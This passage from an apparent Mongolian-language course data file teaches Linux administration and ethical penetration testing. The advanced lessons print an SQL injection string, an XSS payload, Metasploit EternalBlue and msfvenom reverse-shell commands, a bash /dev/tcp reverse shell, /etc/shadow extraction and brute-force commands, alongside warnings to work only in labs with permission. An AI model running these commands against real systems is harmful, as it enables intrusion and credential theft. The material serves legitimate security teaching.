    summary: 'Файлуудыг шахах, задлах.',
    blocks: [
      { type: 'h', text: 'tar архив үүсгэх' },
      { type: 'cmd', cmd: 'tar -czvf backup.tar.gz Documents/' },
      { type: 'h', text: 'Задлах' },
      { type: 'cmd', cmd: 'tar -xzvf backup.tar.gz' },
      { type: 'list', items: [
        'c=create, x=extract, z=gzip шахалт',
        'v=verbose (харуулах), f=файлын нэр',
        'unzip file.zip — zip задлах',
      ] },
      { type: 'note', text: 'Тогтоох арга: "czvf = Create Ze Vile File", "xzvf = eXtract".' },
    ],
  },
  {
    id: 'm17', title: 'Диск — df, du, mount', level: 'Дунд шат',
    summary: 'Дискний зай, mount хийх.',
    blocks: [
      { type: 'cmd', cmd: 'df -h', out: 'Filesystem  Size  Used Avail Use% Mounted on\n/dev/sda1    40G   12G   26G  32% /' },
      { type: 'p', text: 'Хавтасны хэмжээ:' },
      { type: 'cmd', cmd: 'du -sh /home/kali', out: '1.2G  /home/kali' },
      { type: 'cmd', cmd: 'sudo mount /dev/sdb1 /mnt' },
      { type: 'note', text: 'df = диск даяар, du = тодорхой хавтас. USB зэргийг mount-оор холбоно.' },
    ],
  },
  {
    id: 'm18', title: 'grep — regex гүнзгий', level: 'Дунд шат',
    summary: 'Хэв шинжийн илэрхийлэлээр хайх.',
    blocks: [
      { type: 'cmd', cmd: 'grep -r "TODO" .' },
      { type: 'list', items: [
        '-r — рекурсив (хавтас даяар)',
        '-n — мөрийн дугаар',
        '-v — тохироогүй мөрүүд',
        '-E — өргөтгөсөн regex',
      ] },
      { type: 'cmd', cmd: 'grep -E "^root|^kali" /etc/passwd' },
      { type: 'p', text: '^ = мөрийн эхэн, $ = төгсгөл, . = дурын тэмдэгт, * = давталт.' },
      { type: 'note', text: 'Regex бол лог шинжлэх, өгөгдөл шүүхэд зайлшгүй ур чадвар.' },
    ],
  },
  {
    id: 'm19', title: 'sed — урсгал засварлагч', level: 'Дунд шат',
    summary: 'Текстийг автоматаар орлуулах.',
    blocks: [
      { type: 'cmd', cmd: 'echo "сайн уу" | sed "s/сайн/баяртай/"', out: 'баяртай уу' },
      { type: 'p', text: 'Файл доторх бүх тохиолдлыг орлуулах:' },
      { type: 'cmd', cmd: 'sed -i "s/huuchin/shine/g" file.txt' },
      { type: 'note', text: 's/хайх/орлуулах/g — g нь мөр бүрийн бүх тохиолдол. -i нь файлыг шууд засна (болгоомжтой).' },
    ],
  },
  {
    id: 'm20', title: 'awk — баганат боловсруулалт', level: 'Дунд шат',
    summary: 'Багана сонгох, тооцоолох.',
    blocks: [
      { type: 'cmd', cmd: 'cat /etc/passwd | awk -F: "{print $1}"', out: 'root\ndaemon\nkali' },
      { type: 'p', text: '$1 = эхний багана, -F: нь ":" -ээр салгана.' },
      { type: 'cmd', cmd: 'ls -l | awk "{print $9, $5}"' },
      { type: 'note', text: 'awk нь баганат өгөгдөл (лог, CSV)-д хүчтэй. grep+awk+sed гурвыг хослуулбал бараг бүх текст боловсруулалт хийнэ.' },
    ],
  },
  {
    id: 'm21', title: 'cut, sort, uniq, wc', level: 'Дунд шат',
    summary: 'Текст хэрчих, эрэмбэлэх, тоолох.',
    blocks: [
      { type: 'cmd', cmd: 'cut -d: -f1 /etc/passwd' },
      { type: 'cmd', cmd: 'sort names.txt | uniq -c' },
      { type: 'cmd', cmd: 'wc -l /etc/passwd', out: '48 /etc/passwd' },
      { type: 'list', items: [
        'cut -d <тэмдэг> -f <багана> — багана таслах',
        'sort — эрэмбэлэх, uniq — давхардал арилгах',
        'wc -l мөр, -w үг, -c тэмдэгт тоолох',
      ] },
      { type: 'note', text: 'Жишээ: cat access.log | cut -d" " -f1 | sort | uniq -c | sort -rn — хамгийн их хандсан IP-г олно.' },
    ],
  },
  {
    id: 'm22', title: 'find — гүнзгий (-exec, -type)', level: 'Дунд шат',
    summary: 'Олсон файлд үйлдэл хийх.',
    blocks: [
      { type: 'cmd', cmd: 'find / -type f -name "*.conf" 2>/dev/null' },
      { type: 'p', text: 'Олсон файл бүрд команд ажиллуулах:' },
      { type: 'cmd', cmd: 'find . -name "*.tmp" -exec rm {} \\;' },
      { type: 'list', items: [
        '-type f файл, -type d хавтас',
        '-size +100M — 100MB-аас том',
        '-mtime -7 — сүүлийн 7 хоногт өөрчлөгдсөн',
        '2>/dev/null — алдааны мессежийг нуух',
      ] },
      { type: 'note', text: '-exec {} \\; нь олсон зүйл бүрд командыг ажиллуулна. {} нь файлын нэрийг орлоно.' },
    ],
  },
  {
    id: 'm23', title: 'cron — автоматжуулалт', level: 'Дунд шат',
    summary: 'Тогтсон цагт команд ажиллуулах.',
    blocks: [
      { type: 'cmd', cmd: 'crontab -e' },
      { type: 'p', text: 'Мөрийн формат: минут цаг өдөр сар гараг команд.' },
      { type: 'cmd', cmd: '0 2 * * * /home/kali/backup.sh' },
      { type: 'list', items: [
        '0 2 * * * — өдөр бүр 02:00 цагт',
        '*/5 * * * * — 5 минут тутамд',
        '0 0 * * 0 — долоо хоног бүр Ням гарагт',
      ] },
      { type: 'note', text: 'cron нь нөөцлөлт, лог цэвэрлэх зэрэг давтагдах ажлыг автоматжуулна.' },
    ],
  },
  {
    id: 'm24', title: 'Эхний bash скрипт', level: 'Дунд шат',
    summary: 'Shebang, ажиллуулах эрх, эхлэл.',
    blocks: [
      { type: 'p', text: 'Скрипт бол командуудыг дараалуулан бичсэн файл. Эхэнд shebang бичнэ:' },
      { type: 'cmd', cmd: 'nano hello.sh' },
      { type: 'cmd', cmd: '#!/bin/bash\necho "Сайн уу, $USER"\ndate' },
      { type: 'cmd', cmd: 'chmod +x hello.sh' },
      { type: 'cmd', cmd: './hello.sh', out: 'Сайн уу, kali\nTue Jun 30 14:00:00 +08 2026' },
      { type: 'note', text: '#!/bin/bash нь "энэ файлыг bash-аар ажиллуул" гэсэн заавар. ./ нь одоогийн хавтаснаас ажиллуулна.' },
    ],
  },
  {
    id: 'm25', title: 'Хувьсагч ба нөхцөл (if)', level: 'Дунд шат',
    summary: 'Скриптэд хувьсагч, шийдвэр гаргалт.',
    blocks: [
      { type: 'cmd', cmd: 'name="Бат"\necho "Сайн уу, $name"' },
      { type: 'h', text: 'if нөхцөл' },
      { type: 'cmd', cmd: 'if [ -f /etc/passwd ]; then\n  echo "Файл байна"\nelse\n  echo "Байхгүй"\nfi' },
      { type: 'list', items: [
        '-f файл байгаа эсэх, -d хавтас',
        '-z хоосон мөр, -n хоосон биш',
        '"$a" = "$b" тэнцүү, -eq тоон тэнцүү',
      ] },
      { type: 'note', text: '[ ] доторх зайнууд чухал! [ -f файл ] зөв, [-f файл] алдаа.' },
    ],
  },
  {
    id: 'm26', title: 'Давталт — for, while', level: 'Дунд шат',
    summary: 'Олон зүйлд дахин дахин ажиллах.',
    blocks: [
      { type: 'h', text: 'for давталт' },
      { type: 'cmd', cmd: 'for i in 1 2 3; do\n  echo "Тоо: $i"\ndone' },
      { type: 'p', text: 'Файлуудаар давтах:' },
      { type: 'cmd', cmd: 'for f in *.txt; do echo "$f"; done' },
      { type: 'h', text: 'while давталт' },
      { type: 'cmd', cmd: 'i=1\nwhile [ $i -le 3 ]; do\n  echo $i\n  i=$((i+1))\ndone' },
      { type: 'note', text: 'for нь тодорхой жагсаалтаар, while нь нөхцөл биелэх хүртэл давтана.' },
    ],
  },
  {
    id: 'm27', title: 'Функц, аргумент, exit code', level: 'Дунд шат',
    summary: 'Дахин ашиглах код, скриптэд утга дамжуулах.',
    blocks: [
      { type: 'cmd', cmd: 'mendlye() {\n  echo "Сайн уу, $1"\n}\nmendlye Бат', out: 'Сайн уу, Бат' },
      { type: 'p', text: '$1, $2 нь дамжуулсан аргументууд. Скриптэд ./script.sh arg1 хэлбэрээр.' },
      { type: 'h', text: 'Exit code' },
      { type: 'cmd', cmd: 'ls /байхгүй; echo $?', out: '2' },
      { type: 'note', text: '$? нь сүүлийн командын үр дүн (0=амжилт, өөр=алдаа). cmd1 && cmd2 (амжилттай бол), cmd1 || cmd2 (бүтэлгүйтвэл).' },
    ],
  },
  {
    id: 'm28', title: 'Лог файлууд (/var/log)', level: 'Дунд шат',
    summary: 'Системийн бүртгэл унших, ажиглах.',
    blocks: [
      { type: 'cmd', cmd: 'ls /var/log' },
      { type: 'cmd', cmd: 'sudo tail -f /var/log/syslog' },
      { type: 'list', items: [
        'syslog — ерөнхий систем',
        'auth.log — нэвтрэлт, sudo',
        'tail -f — бодит цагт ажиглах',
      ] },
      { type: 'cmd', cmd: 'sudo journalctl -u ssh' },
      { type: 'note', text: 'Лог нь алдаа олох, аюулгүй байдлын мөрдөлтийн үндэс. tail -f нь шинэ мөрүүдийг тухай бүр харуулна.' },
    ],
  },
  {
    id: 'm29', title: 'Багц гүнзгий — dpkg, sources', level: 'Дунд шат',
    summary: 'apt-ийн дотоод, суусан багц шалгах.',
    blocks: [
      { type: 'cmd', cmd: 'dpkg -l | grep nmap' },
      { type: 'p', text: 'Багц аль файлуудыг суулгасан:' },
      { type: 'cmd', cmd: 'dpkg -L nmap | head' },
      { type: 'cmd', cmd: 'apt search wireshark' },
      { type: 'cmd', cmd: 'cat /etc/apt/sources.list' },
      { type: 'note', text: 'apt нь дээд түвшний, dpkg доод түвшний хэрэгсэл. sources.list нь програмыг хаанаас татахыг заана.' },
    ],
  },
  {
    id: 'm30', title: 'Дунд шатны давталт', level: 'Дунд шат',
    summary: 'Систем удирдлага, скриптийн тойм.',
    blocks: [
      { type: 'p', text: 'Та одоо систем удирдах, сүлжээ шалгах, скрипт бичих чадвартай боллоо.' },
      { type: 'list', items: [
        'Bash: хувьсагч, alias, .bashrc',
        'Эрх: chmod тоон, chown, хэрэглэгч',
        'Процесс: ps, kill, systemctl',
        'Сүлжээ: ip, ping, ssh, scp',
        'Текст: grep regex, sed, awk, cut/sort/uniq',
        'Скрипт: if, for, while, функц',
      ] },
      { type: 'note', text: 'Дараагийн "Ахлах шат"-нд эдгээр чадвараа кибер аюулгүй байдал, нэвтрэлтийн тестэд хэрэглэнэ.' },
    ],
  },
];

/* ============================================================
   АХЛАХ ШАТ — 30 хичээл (кибер аюулгүй байдал, pentest)
   Бүгд зөвхөн зөвшөөрөлтэй/лаб орчинд хэрэглэх ёстой.
   ============================================================ */
const AHLAH_SHORT = [
  {
    id: 'a01', title: 'Аюулгүй байдлын үндэс ба ёс зүй', level: 'Ахлах шат',
    summary: 'Pentest гэж юу вэ, хууль ёсны хүрээ.',
    blocks: [
      { type: 'p', text: 'Нэвтрэлтийн тест (penetration testing) бол системийн сул талыг хууль ёсны дагуу, зөвшөөрөлтэйгээр илрүүлж, засахад туслах үйл явц. Зорилго нь хамгаалах, эвдэх биш.' },
      { type: 'h', text: 'Үе шатууд' },
      { type: 'list', items: [
        'Reconnaissance — мэдээлэл цуглуулах',
        'Scanning — порт, үйлчилгээ илрүүлэх',
        'Exploitation — сул талыг ашиглах',
        'Post-exploitation — нэвтэрсний дараах',
        'Reporting — тайлан, зөвлөмж',
      ] },
      { type: 'warn', text: 'ЗӨВХӨН өөрийн эсвэл бичгээр зөвшөөрөл авсан системд л ажилла. Зөвшөөрөлгүй халдлага нь олон оронд хүнд ялтай гэмт хэрэг. Дадлагыг TryHackMe, HackTheBox, өөрийн лаб дээр хий.' },
    ],
  },
  {
    id: 'a02', title: 'Сүлжээний онол (TCP/IP, портууд)', level: 'Ахлах шат',
    summary: 'Багц, порт, протоколын суурь.',
    blocks: [
      { type: 'p', text: 'Pentest хийхэд сүлжээний ажиллагааг ойлгох зайлшгүй. Өгөгдөл багц (packet) хэлбэрээр IP хаягуудын хооронд дамждаг.' },
      { type: 'list', items: [
        'TCP — найдвартай, холболттой (веб, ssh)',
        'UDP — хурдан, холболтгүй (DNS, видео)',
        'Порт — үйлчилгээний "хаалга" (0-65535)',
      ] },
      { type: 'list', items: [
        '22 SSH · 80 HTTP · 443 HTTPS',
        '21 FTP · 25 SMTP · 53 DNS',
        '3306 MySQL · 445 SMB · 3389 RDP',
      ] },
      { type: 'note', text: 'Эдгээр түгээмэл портуудыг цээжилбэл скан хийхэд хурдан баримжаа авна.' },
    ],
  },
  {
    id: 'a03', title: 'Nmap — гүнзгий сканнердалт', level: 'Ахлах шат',
    summary: 'Хост илрүүлэх, порт, хувилбар, OS.',
    blocks: [
      { type: 'cmd', cmd: 'nmap -sn 192.168.1.0/24' },
      { type: 'cmd', cmd: 'nmap -sV -p- 192.168.1.105' },
      { type: 'cmd', cmd: 'sudo nmap -A -T4 192.168.1.105' },
      { type: 'list', items: [
        '-sn хост илрүүлэх, -p- бүх порт',
        '-sV хувилбар, -O OS, -A бүгд',
        '-T4 хурд, -Pn ping алгасах',
      ] },
      { type: 'note', text: 'Энэ командуудыг "terminal нээх" хэсэгт бодитоор турш — nmap бүрэн ажиллана.' },
    ],
  },
  {
    id: 'a04', title: 'Nmap NSE скриптүүд', level: 'Ахлах шат',
    summary: 'Скрипт хөдөлгүүрээр гүнзгий шалгах.',
    blocks: [
      { type: 'cmd', cmd: 'nmap -sC 192.168.1.105' },
      { type: 'cmd', cmd: 'nmap --script=vuln 192.168.1.105' },
      { type: 'cmd', cmd: 'nmap --script=http-enum -p80 192.168.1.105' },
      { type: 'note', text: 'NSE script-ууд /usr/share/nmap/scripts/ дотор. vuln ангилал нь мэдэгдэж буй сул талыг шалгана.' },
    ],
  },
  {
    id: 'a05', title: 'Service enumeration', level: 'Ахлах шат',
    summary: 'Илэрсэн үйлчилгээг гүнзгий судлах.',
    blocks: [
      { type: 'p', text: 'Скан хийсний дараа илэрсэн үйлчилгээ бүрийг нарийвчлан судлах нь чухал. Энэ алхмыг enumeration гэнэ.' },
      { type: 'cmd', cmd: 'nmap -p445 --script smb-enum-shares 192.168.1.110' },
      { type: 'cmd', cmd: 'enum4linux 192.168.1.110' },
      { type: 'list', items: [
        'SMB (445) — хуваалцсан хавтас, хэрэглэгч',
        'FTP (21) — anonymous нэвтрэлт',
        'HTTP (80) — хавтас, технологи',
      ] },
      { type: 'note', text: 'Enumeration нь pentest-ийн хамгийн чухал, цаг их шаардсан үе шат. "Enumerate, enumerate, enumerate".' },
    ],
  },
  {
    id: 'a06', title: 'Wireshark / tshark гүнзгий', level: 'Ахлах шат',
    summary: 'Трафик барих, шүүх, шинжлэх.',
    blocks: [
      { type: 'cmd', cmd: 'tshark -D' },
      { type: 'cmd', cmd: 'tshark -i eth0 -Y "http" -c 10' },
      { type: 'cmd', cmd: 'tshark -i eth0 -w capture.pcap' },
      { type: 'list', items: [
        'ip.addr == X — тодорхой хост',
        'tcp.port == 80 — порт',
        'http.request — HTTP хүсэлт',
      ] },
      { type: 'warn', text: 'Зөвхөн өөрийн/зөвшөөрөлтэй сүлжээний трафикийг барь. Бусдын трафик чагнах хууль бус.' },
    ],
  },
  {
    id: 'a07', title: 'tcpdump — CLI трафик', level: 'Ахлах шат',
    summary: 'Командын мөрнөөс багц барих.',
    blocks: [
      { type: 'cmd', cmd: 'sudo tcpdump -i eth0' },
      { type: 'cmd', cmd: 'sudo tcpdump -i eth0 port 80 -w web.pcap' },
      { type: 'cmd', cmd: 'sudo tcpdump -i eth0 host 192.168.1.110' },
      { type: 'note', text: 'tcpdump нь GUI-гүй сервер дээр трафик барихад тохиромжтой. .pcap файлыг дараа Wireshark-аар нээж болно.' },
    ],
  },
  {
    id: 'a08', title: 'Netcat — олон талт хэрэгсэл', level: 'Ахлах шат',
    summary: 'Холболт, порт сонсох, файл дамжуулах.',
    blocks: [
      { type: 'p', text: 'Netcat (nc) бол сүлжээний "швейцар хутга". Холболт үүсгэх, порт сонсох, файл дамжуулах олон үүрэгтэй.' },
      { type: 'cmd', cmd: 'nc -lvnp 4444' },
      { type: 'cmd', cmd: 'nc 192.168.1.110 80' },
      { type: 'list', items: [
        '-l сонсох (listen), -v дэлгэрэнгүй',
        '-n DNS алгасах, -p порт',
      ] },
      { type: 'note', text: 'nc нь reverse shell хүлээн авах, портыг гараар шалгахад түгээмэл хэрэглэгдэнэ.' },
    ],
  },
  {
    id: 'a09', title: 'Веб аюулгүй байдлын үндэс', level: 'Ахлах шат',
    summary: 'HTTP, request/response, status codes.',
    blocks: [
      { type: 'cmd', cmd: 'curl -I https://example.com', out: 'HTTP/2 200\nserver: Apache\ncontent-type: text/html' },
      { type: 'list', items: [
        'GET — өгөгдөл авах, POST — илгээх',
        '200 OK, 301 redirect, 403 хориглосон, 404 олдоогүй, 500 алдаа',
        'Header-ууд: Server, Cookie, Authorization',
      ] },
      { type: 'cmd', cmd: 'curl -s https://example.com | head' },
      { type: 'note', text: 'Веб халдлагын ихэнх нь HTTP хүсэлтийг ойлгох, өөрчлөхөд тулгуурладаг.' },
    ],
  },
  {
    id: 'a10', title: 'Gobuster / dirb — хавтас илрүүлэх', level: 'Ахлах шат',
    summary: 'Веб серверийн нуугдсан зам олох.',
    blocks: [
      { type: 'cmd', cmd: 'gobuster dir -u http://192.168.1.110 -w /usr/share/wordlists/dirb/common.txt' },
      { type: 'cmd', cmd: 'dirb http://192.168.1.110' },
      { type: 'p', text: 'Дэд домэйн хайх:' },
      { type: 'cmd', cmd: 'gobuster dns -d example.com -w wordlist.txt' },
      { type: 'note', text: 'Wordlist ашиглан /admin, /backup зэрэг нуугдсан хуудсыг олно. SecLists багц олон сайн wordlist агуулдаг.' },
    ],
  },
  {
    id: 'a11', title: 'Nikto — веб сканнер', level: 'Ахлах шат',
    summary: 'Веб серверийн сул талыг автоматаар шалгах.',
    blocks: [
      { type: 'cmd', cmd: 'nikto -h http://192.168.1.110' },
      { type: 'list', items: [
        'Хуучирсан серверийн хувилбар',
        'Аюултай файл, тохиргооны алдаа',
        'Default хуудас, нуугдсан зам',
      ] },
      { type: 'note', text: 'Nikto хурдан тойм өгдөг ч "чимээтэй". Бодит орчинд хяналт нь анзаарна.' },
    ],
  },
  {
    id: 'a12', title: 'Burp Suite үндэс', level: 'Ахлах шат',
    summary: 'Веб прокси, хүсэлт таслан засах.',
    blocks: [
      { type: 'p', text: 'Burp Suite бол веб аппликэшний аюулгүй байдлын гол хэрэгсэл. Browser-ийн трафикийг прокси-аар дамжуулж, хүсэлтийг таслан засна.' },
      { type: 'list', items: [
        'Proxy — хүсэлтийг барих, өөрчлөх',
        'Repeater — хүсэлтийг дахин илгээх',
        'Intruder — автомат халдлага (fuzzing)',
        'Decoder — кодчилол хөрвүүлэх',
      ] },
      { type: 'note', text: 'Browser-ийн proxy-г 127.0.0.1:8080 болгож тохируулна. OWASP ZAP нь үнэгүй хувилбар.' },
    ],
  },
  {
    id: 'a13', title: 'SQL injection ойлголт', level: 'Ахлах шат',
    summary: 'Өгөгдлийн сангийн хамгийн түгээмэл сул тал.',
    blocks: [
      { type: 'p', text: 'SQL injection нь хэрэглэгчийн оруулсан утгыг шууд SQL асуулгад залгаснаас үүсдэг. Халдагч өгөгдлийн санг удирдаж чадна.' },
      { type: 'cmd', cmd: "' OR '1'='1" },
      { type: 'cmd', cmd: 'sqlmap -u "http://site/page?id=1" --dbs' },
      { type: 'warn', text: 'Зөвхөн зөвшөөрөлтэй системд туршина. Хамгаалалт: parameterized query (prepared statements), input validation ашиглах.' },
    ],
  },
  {
    id: 'a14', title: 'XSS ойлголт', level: 'Ахлах шат',
    summary: 'Cross-Site Scripting халдлага, хамгаалалт.',
    blocks: [
      { type: 'p', text: 'XSS нь халдагч хортой JavaScript-ийг вэб хуудсанд оруулж, бусад хэрэглэгчийн browser дээр ажиллуулдаг.' },
      { type: 'cmd', cmd: '<script>alert("XSS")</script>' },
      { type: 'list', items: [
        'Stored — серверт хадгалагдаж олон хүнд нөлөөлнө',
        'Reflected — URL-аар тусгагдана',
        'DOM-based — клиент талд',
      ] },
      { type: 'warn', text: 'Хамгаалалт: гаралтыг escape хийх, Content-Security-Policy, input цэвэрлэх. Зөвхөн зөвшөөрөлтэй туршина.' },
    ],
  },
  {
    id: 'a15', title: 'Metasploit — фреймворк', level: 'Ахлах шат',
    summary: 'msfconsole, module хайх, тохируулах.',
    blocks: [
      { type: 'cmd', cmd: 'msfconsole' },
      { type: 'cmd', cmd: 'search type:exploit eternalblue' },
      { type: 'cmd', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
      { type: 'cmd', cmd: 'set RHOSTS 192.168.1.110\nset LHOST 192.168.1.105' },
      { type: 'note', text: 'RHOSTS = зорилтот, LHOST = өөрийн хаяг. show options-оор заавал тавих утгуудыг хар.' },
    ],
  },
  {
    id: 'a16', title: 'Meterpreter', level: 'Ахлах шат',
    summary: 'Нэвтэрсний дараах хүчирхэг payload.',
    blocks: [
      { type: 'p', text: 'Meterpreter бол Metasploit-ийн дэвшилтэт payload — санах ойд ажилладаг, олон чадвартай.' },
      { type: 'list', items: [
        'sysinfo — системийн мэдээлэл',
        'getuid — эрх шалгах',
        'hashdump — нууц үгийн hash',
        'download/upload — файл',
        'screenshot, keyscan_start',
      ] },
      { type: 'cmd', cmd: 'background\nsessions -l' },
      { type: 'warn', text: 'Эдгээр чадвар зөвхөн зөвшөөрөлтэй penetration test-д. Бусад тохиолдолд хууль зөрчинө.' },
    ],
  },
  {
    id: 'a17', title: 'msfvenom — payload үүсгэх', level: 'Ахлах шат',
    summary: 'Захиалгат payload бэлтгэх.',
    blocks: [
      { type: 'cmd', cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.105 LPORT=4444 -f elf -o shell.elf' },
      { type: 'list', items: [
        '-p payload төрөл',
        'LHOST/LPORT холбогдох хаяг',
        '-f формат (elf, exe, php...)',
      ] },
      { type: 'note', text: 'Үүсгэсэн payload-ыг зорилтот системд ажиллуулж, nc -lvnp 4444 -ээр холболт хүлээн авна (зөвхөн лаб орчинд).' },
    ],
  },
  {
    id: 'a18', title: 'Privilege escalation (Linux)', level: 'Ахлах шат',
    summary: 'Энгийн хэрэглэгчээс root болох.',
    blocks: [
      { type: 'p', text: 'Системд анхны нэвтрэлт ихэвчлэн хязгаарлагдмал эрхтэй. Privesc нь root эрх олж авах үе шат.' },
      { type: 'cmd', cmd: 'sudo -l' },
      { type: 'cmd', cmd: 'find / -perm -4000 2>/dev/null' },
      { type: 'list', items: [
        'SUID файлууд (-perm -4000)',
        'Буруу sudo тохиргоо',
        'Cron job, бичих эрхтэй файл',
        'Kernel exploit',
      ] },
      { type: 'note', text: 'linpeas.sh, LinEnum.sh зэрэг скрипт энэ хайлтыг автоматжуулна.' },
    ],
  },
  {
    id: 'a19', title: 'Нууц үг — John the Ripper', level: 'Ахлах шат',
    summary: 'Hash-аас нууц үг сэргээх.',
    blocks: [
      { type: 'cmd', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
      { type: 'cmd', cmd: 'john --show hashes.txt' },
      { type: 'p', text: 'Linux нууц үгийг бэлтгэх:' },
      { type: 'cmd', cmd: 'unshadow /etc/passwd /etc/shadow > hashes.txt' },
      { type: 'note', text: 'rockyou.txt бол хамгийн алдартай wordlist (14 сая нууц үг). Зөвхөн зөвшөөрөлтэй hash-д ажилла.' },
    ],
  },
  {
    id: 'a20', title: 'Hashcat — GPU таалт', level: 'Ахлах шат',
    summary: 'Хурдан, орчин үеийн нууц үгийн audit.',
    blocks: [
      { type: 'cmd', cmd: 'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt' },
      { type: 'list', items: [
        '-m 0 MD5, 100 SHA1, 1000 NTLM, 1800 sha512crypt',
        '-a 0 wordlist, -a 3 brute-force (mask)',
      ] },
      { type: 'cmd', cmd: 'hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d' },
      { type: 'note', text: 'Hashcat GPU ашиглаж John-оос хурдан. Hash төрлийг hashid эсвэл hash-identifier-ээр тогтооно.' },
    ],
  },
  {
    id: 'a21', title: 'Hydra — online brute force', level: 'Ахлах шат',
    summary: 'Үйлчилгээний нэвтрэлт туршилт.',
    blocks: [
      { type: 'cmd', cmd: 'hydra -l admin -P rockyou.txt ssh://192.168.1.110' },
      { type: 'cmd', cmd: 'hydra -L users.txt -P pass.txt 192.168.1.110 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
      { type: 'warn', text: 'Online brute force нь "чимээтэй", акаунт түгжиж, хяналтад илэрнэ. Зөвхөн зөвшөөрөлтэй системд. Хамгаалалт: rate-limit, 2FA, fail2ban.' },
    ],
  },
  {
    id: 'a22', title: 'Wireless үндэс (aircrack-ng)', level: 'Ахлах шат',
    summary: 'WiFi аюулгүй байдлын тест.',
    blocks: [
      { type: 'cmd', cmd: 'sudo airmon-ng start wlan0' },
      { type: 'cmd', cmd: 'sudo airodump-ng wlan0mon' },
      { type: 'cmd', cmd: 'aircrack-ng -w rockyou.txt capture.cap' },
      { type: 'warn', text: 'Зөвхөн ӨӨРИЙН WiFi сүлжээг л тест. Бусдын сүлжээнд халдах нь хууль бус. Monitor mode дэмждэг адаптер шаардана.' },
    ],
  },
  {
    id: 'a23', title: 'Forensics ба steganography', level: 'Ахлах шат',
    summary: 'Нуугдсан өгөгдөл, ул мөр шинжлэх.',
    blocks: [
      { type: 'cmd', cmd: 'file mystery.bin', out: 'mystery.bin: PNG image data' },
      { type: 'cmd', cmd: 'strings secret.jpg | grep -i pass' },
      { type: 'cmd', cmd: 'steghide extract -sf image.jpg' },
      { type: 'cmd', cmd: 'exiftool photo.jpg' },
      { type: 'note', text: 'CTF-д түгээмэл: зурган дотор нуусан текст, метадата, файлын бодит төрлийг шалгана. binwalk нь бүтэц задлана.' },
    ],
  },
  {
    id: 'a24', title: 'Reverse shell', level: 'Ахлах шат',
    summary: 'Зорилтот системээс буцах холболт авах.',
    blocks: [
      { type: 'p', text: 'Reverse shell нь зорилтот машин таны сонсож буй порт руу холбогдож, та удирдлага авна (галт ханыг тойрох арга).' },
      { type: 'cmd', cmd: 'nc -lvnp 4444' },
      { type: 'cmd', cmd: 'bash -i >& /dev/tcp/192.168.1.105/4444 0>&1' },
      { type: 'p', text: 'Тогтвортой болгох:' },
      { type: 'cmd', cmd: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"' },
      { type: 'warn', text: 'Зөвхөн лаб/зөвшөөрөлтэй орчинд. revshells.com олон хувилбар санал болгодог.' },
    ],
  },
  {
    id: 'a25', title: 'Pivoting ба tunneling', level: 'Ахлах шат',
    summary: 'Дотоод сүлжээ рүү гүнзгийрэх.',
    blocks: [
      { type: 'p', text: 'Нэг машинд нэвтэрсний дараа түүгээр дамжуулж дотоод сүлжээний бусад машин руу хүрэхийг pivoting гэнэ.' },
      { type: 'cmd', cmd: 'ssh -L 8080:192.168.2.10:80 kali@192.168.1.110' },
      { type: 'list', items: [
        '-L локал порт дамжуулалт',
        '-D динамик (SOCKS proxy)',
        'chisel, proxychains түгээмэл',
      ] },
      { type: 'note', text: 'proxychains nmap ... гэснээр scan-ийг pivot-аар дамжуулна. Энэ нь дэвшилтэт сэдэв.' },
    ],
  },
  {
    id: 'a26', title: 'OPSEC ба ул мөр', level: 'Ахлах шат',
    summary: 'Лог, нотлох баримт, ёс зүйтэй ажиллагаа.',
    blocks: [
      { type: 'p', text: 'Хууль ёсны pentest-д ч ажиллагаагаа баримтжуулах, системд хохирол учруулахгүй байх нь чухал.' },
      { type: 'list', items: [
        'Хийсэн үйлдэл бүрээ тэмдэглэх (timestamp)',
        'Зөвхөн scope доторх системд ажиллах',
        'Олсон сул талыг ашиглахаас өмнө зөвшөөрөл',
        'Эмзэг өгөгдлийг хамгаалах',
      ] },
      { type: 'warn', text: 'Лог устгах, ул мөр нуух нь хууль ёсны тестэд хийдэггүй — харин ч бүх зүйлийг ил тод тэмдэглэнэ.' },
    ],
  },
  {
    id: 'a27', title: 'Тайлан бичих (reporting)', level: 'Ахлах шат',
    summary: 'Олдворыг ойлгомжтой, ашигтай хэлбэрээр.',
    blocks: [
      { type: 'p', text: 'Pentest-ийн хамгийн чухал бүтээгдэхүүн нь тайлан. Техникийн бус удирдлага ч ойлгохуйц байх ёстой.' },
      { type: 'list', items: [
        'Executive summary — товч дүгнэлт',
        'Олдвор бүр: тайлбар, нотолгоо (PoC), эрсдэл',
        'CVSS оноо — ноцтой байдлын зэрэг',
        'Засах зөвлөмж (remediation)',
      ] },
      { type: 'note', text: 'Сайн тайлан нь "юу олсон" төдийгүй "яаж засах"-ыг тодорхой заана. Энэ нь pentester-ийн жинхэнэ үнэ цэн.' },
    ],
  },
  {
    id: 'a28', title: 'CTF аргачлал', level: 'Ахлах шат',
    summary: 'Дадлагын платформ, бодлого бодох арга.',
    blocks: [
      { type: 'p', text: 'CTF (Capture The Flag) бол аюулгүй байдлын ур чадварыг хууль ёсны, тоглоомын хэлбэрээр сорих тэмцээн.' },
      { type: 'list', items: [
        'TryHackMe — эхлэгчдэд ээлтэй, заавартай',
        'HackTheBox — бодит түвшний сорилт',
        'PicoCTF — суурь, оюутнуудад',
        'VulnHub — татаж авах эмзэг VM',
      ] },
      { type: 'note', text: 'Арга: enumerate → сул тал олох → exploit → privesc → flag. Тэмдэглэл хөтлөх нь сурахад тусална.' },
    ],
  },
  {
    id: 'a29', title: 'Хууль эрх зүй ба хариуцлага', level: 'Ахлах шат',
    summary: 'Ёс зүйтэй хакерын хил хязгаар.',
    blocks: [
      { type: 'p', text: 'Техникийн чадвар хэдий чинээ өндөр байна, хариуцлага төдий чинээ их. Ёс зүйтэй хакер хууль, зөвшөөрлийн хүрээнд л ажиллана.' },
      { type: 'list', items: [
        'Бичгээр зөвшөөрөл (scope, хугацаа) заавал',
        'Олдсон эмзэг мэдээллийг задруулахгүй',
        'Хохирол учруулахгүй, нөхөн сэргээх',
        'Responsible disclosure — алдааг эзэнд нь мэдэгдэх',
      ] },
